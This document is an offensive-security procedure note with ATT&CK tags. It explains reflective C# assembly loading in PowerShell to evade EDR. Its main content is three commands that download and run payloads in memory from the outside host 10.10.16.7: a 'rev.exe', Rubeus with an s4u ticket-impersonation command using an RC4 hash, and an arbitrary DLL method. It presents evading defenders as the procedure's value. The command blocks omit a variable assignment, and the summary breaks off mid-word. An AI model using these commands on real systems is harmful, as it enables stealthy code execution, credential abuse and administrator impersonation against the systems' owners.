---
id: ec45d777-3be1-4bec-a458-66a559af68a1
name: Reflective Assembly Loading with Powershell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.089475+00:00'
updated_at: '2023-04-10T20:37:02.166980+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
sub_techniques:
- '[[PowerShell|T1059.001 - PowerShell]]'
- '[[Unix Shell|T1059.004 - Unix Shell]]'
- '[[Windows Command Shell|T1059.003 - Windows Command Shell]]'
tags:
- '[[Load C# assembly reflectively]]'
- '[[Powershell]]'
commands:
- '[[Download and run assembly without arguments]]'
- '[[Download and run Rubeus with arguments]]'
- '[[Execute a specific method from an assembly]]'
---

# Reflective Assembly Loading with Powershell

## Summary

Reflective assembly loading is a technique that is often used by attackers to bypass security controls and execute malicious code in memory. This technique is particularly useful for bypassing endpoint detection and response (EDR) solutions that rely on monitoring file system activity. In this proc

## Description

# Description

Reflective assembly loading is a technique that is often used by attackers to bypass security controls and execute malicious code in memory. This technique is particularly useful for bypassing endpoint detection and response (EDR) solutions that rely on monitoring file system activity. In this procedure, we will use Powershell to download and execute a C# assembly and DLL reflectively.

The technical explanation of this procedure is that we will use Powershell to load a C# assembly and its DLL into memory without writing any files to disk. This is accomplished by using the System.Reflection.Assembly class in .NET to load the assembly and its dependencies into memory. Once the assembly is loaded, we can call its methods and execute its code.

The business value of this procedure is that it allows attackers to execute code in memory without leaving any trace on the file system. This makes it difficult for defenders to detect and respond to attacks, and can lead to data theft, system compromise, and other serious security incidents.

## Requirements

1. Powershell access on the target system

1. Network access to download the assembly and DLL

1. Knowledge of the assembly and its dependencies

## Defense

1. Implement application control to prevent execution of unauthorized applications

1. Monitor network traffic for suspicious activity, such as downloads of unknown files

1. Implement endpoint detection and response (EDR) solutions to detect and respond to suspicious activity

## Objectives

1. Download and execute a C# assembly and DLL reflectively

1. Bypass endpoint detection and response (EDR) solutions

1. Execute code in memory without leaving a trace on the file system

# Instructions

1. To download and execute an assembly without arguments, copy the first command provided and replace the URL with the URL of the assembly you want to download and execute. To download and execute Rubeus with arguments, replace the URL with the URL of the Rubeus executable and replace the arguments within the parentheses with the arguments you want to use. Make sure to split the arguments. To execute a specific method from an assembly, replace the URL with the URL of the DLL and replace the class and method names within the parentheses with the appropriate names.

**Code**: [[# Download and run assembly without arguments
$dat]]

> The provided commands can be used to download and execute assemblies and DLLs. The first command can be used to download and execute an assembly without arguments. The second command can be used to download and execute Rubeus with arguments. The third command can be used to execute a specific method from an assembly. The instructions provide details on how to modify the commands to download and execute the desired assemblies and DLLs.

**Command** ([[Download and run assembly without arguments]]):

```bash
(New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()
```

**Command** ([[Download and run Rubeus with arguments]]):

```bash
(New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
```

**Command** ([[Execute a specific method from an assembly]]):

```bash
(New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]

### Sub-Techniques

- [[PowerShell|T1059.001 - PowerShell]]
- [[Unix Shell|T1059.004 - Unix Shell]]
- [[Windows Command Shell|T1059.003 - Windows Command Shell]]

## Commands Used

- [[Download and run assembly without arguments]]
- [[Download and run Rubeus with arguments]]
- [[Execute a specific method from an assembly]]

## Tags

- [[Load C# assembly reflectively]]
- [[Powershell]]
